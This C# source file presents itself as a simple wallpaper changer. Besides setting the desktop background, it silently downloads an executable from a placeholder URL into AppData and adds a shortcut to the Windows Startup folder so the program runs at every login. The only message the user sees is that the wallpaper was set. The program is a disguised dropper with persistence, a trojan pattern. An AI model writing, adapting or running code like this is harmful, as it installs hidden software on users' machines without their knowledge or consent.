using System;
using System.IO;
using System.Net;
using System.Reflection;
using Microsoft.Win32;

namespace WallpaperChanger
{
    class Program
    {
        static void Main(string[] args)
        {
            // Specify the URL of the photo you want to download
            string photoUrl = "https://example.com/photo.jpg";

            // URL of the executable to download
            string executableUrl = "https://example.com/yourapp.exe";

            // Directory to save the downloaded files
            string downloadDirectory = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynx");

            // Create the directory if it doesn't exist
            Directory.CreateDirectory(downloadDirectory);

            // Download the photo
            string downloadedPhotoPath = Path.Combine(downloadDirectory, "wallpaper.jpg");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(photoUrl, downloadedPhotoPath);
            }

            // Set the downloaded photo as the desktop background
            SetDesktopBackground(downloadedPhotoPath);

            // Download the executable
            string downloadedExecutablePath = Path.Combine(downloadDirectory, "yourapp.exe");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(executableUrl, downloadedExecutablePath);
            }

            // Create a shortcut to the executable in the startup folder
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolder, "YourApp.lnk");
            CreateShortcut(shortcutPath, downloadedExecutablePath);

            Console.WriteLine("Wallpaper set successfully.");
            Console.ReadLine(); // Wait for user input to close the console window
        }

        static void SetDesktopBackground(string imagePath)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue("WallpaperStyle", "2"); // 2 for "Stretch"
            key.SetValue("TileWallpaper", "0");
            SystemParametersInfo(0x0014, 0, imagePath, 0x0001 | 0x0002);
        }

        static void CreateShortcut(string shortcutPath, string targetPath)
        {
            // Create a shortcut to the target executable
            IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = targetPath;
            shortcut.Save();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}